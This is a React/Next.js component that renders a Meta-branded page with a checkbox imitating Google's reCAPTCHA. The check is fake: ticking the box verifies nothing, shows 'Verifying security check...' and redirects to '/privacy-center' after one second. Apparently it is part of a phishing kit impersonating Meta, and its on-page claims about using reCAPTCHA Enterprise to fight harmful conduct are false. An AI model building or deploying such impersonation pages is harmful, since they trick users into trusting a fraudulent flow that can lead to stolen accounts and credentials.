'use client'

import React from 'react'
import { useRouter } from 'next/navigation'

const ReCaptcha = () => {
    const [isChecked, setIsChecked] = React.useState(false);
    const [isVerifying, setIsVerifying] = React.useState(false);
    const router = useRouter()

    const handleCheckboxClick = (e: React.ChangeEvent<HTMLInputElement>) => {
        if (e.target.checked && !isVerifying) {
            setIsChecked(true);
            setIsVerifying(true);
            setTimeout(() => {
                router.push("/privacy-center")
            }, 1000);
        }
    };

    return (
        <div className="bg-[#ffffff] flex flex-col items-center justify-start h-screen w-full">
            <div className="font-roboto text-[14px] text-gray-800 w-full h-full flex flex-col justify-center p-4 md:p-0 max-w-[325px]">
                <div className="w-full">
                    <img src="/images/meta/logo-meta.svg" alt="logo" className="w-[64px]" />
                </div>

                <div className='flex items-center justify-start bg-cover bg-center py-5 w-full font-helvetica'>
                    <div className="w-full rounded-[12px] border border-[#d7dde8] bg-[#fbfcfe] px-[12px] py-[10px] shadow-[0_6px_18px_rgba(16,24,40,0.06)]">
                        <div className="flex flex-row items-center justify-between">
                            <div className="flex flex-row items-center justify-start">
                                <label className="checkbox path flex items-center justify-center">
                                    <input
                                        type="checkbox"
                                        checked={isChecked}
                                        id='checked-capcha'
                                        onChange={handleCheckboxClick}
                                        disabled={isVerifying}
                                        aria-label='I am not a robot'
                                    />
                                    <svg viewBox="0 0 21 21">
                                        <path d="M5,10.75 L8.5,14.25 L19.4,2.3 C18.8333333,1.43333333 18.0333333,1 17,1 L4,1 C2.35,1 1,2.35 1,4 L1,17 C1,18.65 2.35,20 4,20 L17,20 C18.65,20 20,18.65 20,17 L20,7.99769186"></path>
                                    </svg>
                                </label>
                                <label htmlFor='checked-capcha' className="ml-[10px] cursor-pointer text-[14px] text-[#1f2937] font-semibold tracking-normal">
                                    I&apos;m not a robot
                                </label>
                            </div>
                            <div className="flex items-center flex-col text-[#8b93a6] mb-[2px]">
                                <img src="/images/meta/recaptcha.png" alt="recaptcha" className="w-[40px] h-[40px] mt-[.2rem]" />
                                <span className="text-[10px] font-bold">reCAPTCHA</span>
                                <div className="text-[8px]">
                                    <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
                                    <span> - </span>
                                    <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
                                </div>
                            </div>
                        </div>
                        <p className="mt-[6px] text-[11px] text-[#667085]">{isVerifying ? 'Verifying security check...' : 'Complete this security step to continue.'}</p>
                    </div>
                </div>

                <div className="text-gray-700 font-helvetica text-[13px] leading-[1.3]">
                    <p className="font-normal">This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
                    <p className="font-normal mt-4">We’ve used Google’s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.</p>
                    <p className="font-normal mt-4">reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
                </div>
            </div>
        </div>
    )
}

export default ReCaptcha